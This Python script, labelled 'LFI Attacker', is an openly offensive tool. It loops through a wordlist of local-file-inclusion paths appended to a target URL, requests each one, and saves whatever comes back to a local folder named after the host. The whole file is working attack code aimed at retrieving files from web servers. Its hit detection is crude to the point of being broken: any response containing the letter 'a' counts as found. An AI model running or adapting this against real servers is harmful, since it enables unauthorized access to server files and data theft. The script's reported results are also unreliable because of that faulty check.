#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import argparse
import os
import sys
from urllib.parse import urlparse

BANNER = r"""
      		   __    _____ _ ___   __  __                __
	 (@_      / /   / ____(_)   | / /_/ /_ _____ _______/ /____  ______
	  ) \____/ /___/ /___/ / /\ |/  _/  _// __ `/ ___/ / /  _  \/ ____/__________
(_)@8@8{}<   ___/ /___/ __/_/ / /_| |/ / / / / / / / /  /   /  \_/ / /_______________>
	  )_/  / /___/ /   / / __   / /_/ /_/ /_/ / /__/   /  ____/ /
	 (@   /_____/_/   /_/_/  |__\__/\__/\__,_/\___/_/|_|\____/_/
"""

print("\033[1;36m" + BANNER + "\033[0m")
print("====> [ LFI Attacker ]\t\t[ Author: FachrulRH ] <====")
print("====> [ Good Luck :) ]\t\t[ ig: @fachrull.rh  ] <====\n")

parser = argparse.ArgumentParser(description="LFI Attacker (Python3 port)")
parser.add_argument("-u", "--url", help="Target URL e.g. http://www.example.com/", dest='target', required=True)
parser.add_argument("--path", help="Add your Custom Directory (appended to target)", dest='path', default='')
parser.add_argument("--type", help="Server OS Type i.e. linux or windows", dest='type', default='linux')

args = parser.parse_args()

target = args.target.strip()
if not (target.startswith('http://') or target.startswith('https://')):
    target = 'http://' + target

if args.path:
    # ensure path begins with a slash
    if not args.path.startswith('/'):
        target = target + '/' + args.path
    else:
        target = target + args.path

# Scan the link and put the found links to list founds
founds = []
def scan(links):
    try:
        for link in links:
            full = target.rstrip('/') + '/' + link.lstrip('/')
            try:
                req = requests.get(full, timeout=10)
            except requests.RequestException as e:
                print(f'\033[0;31m[-] Request error for {full}: {e}')
                continue

            # optionally inspect content-type
            content_type = req.headers.get('Content-Type', '')
            # crude check: look for anchor tags in response text
            text = req.text if req.encoding or 'text' in content_type else ''
            if 'a' in text:
                print(f'\033[0;32m[+] Path found !: {full}')
                founds.append(full)
            else:
                print(f'\033[0;31m[-] {full}')
    except KeyboardInterrupt:
        print("\nCTRL+C detected !")
        print("\033[0;36mSystem quit.....")
        sys.exit(1)

# Get path list from lfi-paths.txt
paths = []
def get_paths(os_type):
    t = (os_type or '').lower()
    try:
        with open('lfi-paths.txt', 'r', encoding='utf-8', errors='ignore') as wordlist:
            for directory in wordlist:
                directory = directory.strip()
                if not directory:
                    continue
                try:
                    if 'windows' in t:
                        # skip typical *nix paths when windows selected
                        if any(p in directory for p in ('var', 'usr', 'srv', 'Library', 'apache', 'proc', 'sbin')):
                            continue
                        paths.append(directory)
                    elif 'linux' in t:
                        # skip windows C: paths on linux selection
                        if 'C:' in directory:
                            continue
                        paths.append(directory)
                    else:
                        # unknown type -> include all
                        paths.append(directory)
                except Exception:
                    paths.append(directory)
    except IOError:
        print('\033[0;31m[-] Wordlist (lfi-paths.txt) not found!')
        sys.exit(1)

# Get domain name for folder name
parse = urlparse(target)
nhost = parse.netloc or 'output'

# Get file names in found urls
fnames = []
def get_name(founds_list):
    for gname in founds_list:
        name = gname.rstrip('/').split('/')[-1] or 'index'
        fnames.append(name)

def directory():
    if not os.path.exists(nhost):
        os.makedirs(nhost, exist_ok=True)
    os.chdir(nhost)

# Get the files in found urls
def get_files(files, names):
    for file, name in zip(files, names):
        try:
            req = requests.get(file, timeout=10)
        except requests.RequestException as e:
            print(f'\033[0;31m[-] Request failed for {file}: {e}')
            continue

        stat = req.status_code
        if stat == 200:
            print(f"\033[0;32m[+] Success to get: {file}")
            print("\033[0;36mSaving the file.....")
            # save as bytes (may be binary)
            try:
                with open(f"{name}.txt", 'wb') as f:
                    f.write(req.content)
                print("\033[0;32m[+] Success!\n")
            except OSError as e:
                print(f'\033[0;31m[-] Failed to save {name}.txt: {e}')
        else:
            print(f'\033[0;31m[-] Failed to get : {file} (status {stat})')

# Start getting files and save the files
def end():
    total = len(founds)
    print(f"\n\033[0;32mPath founds : {total}")

# main flow
get_paths(args.type)
links = paths
scan(links)
end()

if founds:
    directory()
    get_name(founds)
    files = founds
    names = fnames
    get_files(files, names)
    where = os.getcwd()
    print(f"\033[0;36m[+] Success file save in {where}")
else:
    print("\033[0;33m[!] No paths found, nothing to save.")
